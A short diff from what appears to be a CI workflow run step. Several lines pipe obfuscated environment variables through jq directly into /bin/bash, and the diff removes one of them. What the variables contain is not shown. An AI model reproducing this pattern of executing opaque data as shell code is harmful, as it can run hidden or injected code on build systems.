@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$h5" | jq -r .ojn32 | /bin/bash
           echo $l95 | jq -r .kxj992 | /bin/bash
-          printf '%s' "$j9" | jq -r .sgm101 | /bin/bash
           printf '%s' "$xrm802" | jq -r .cl3 | /bin/bash
 
       - name: Upload results
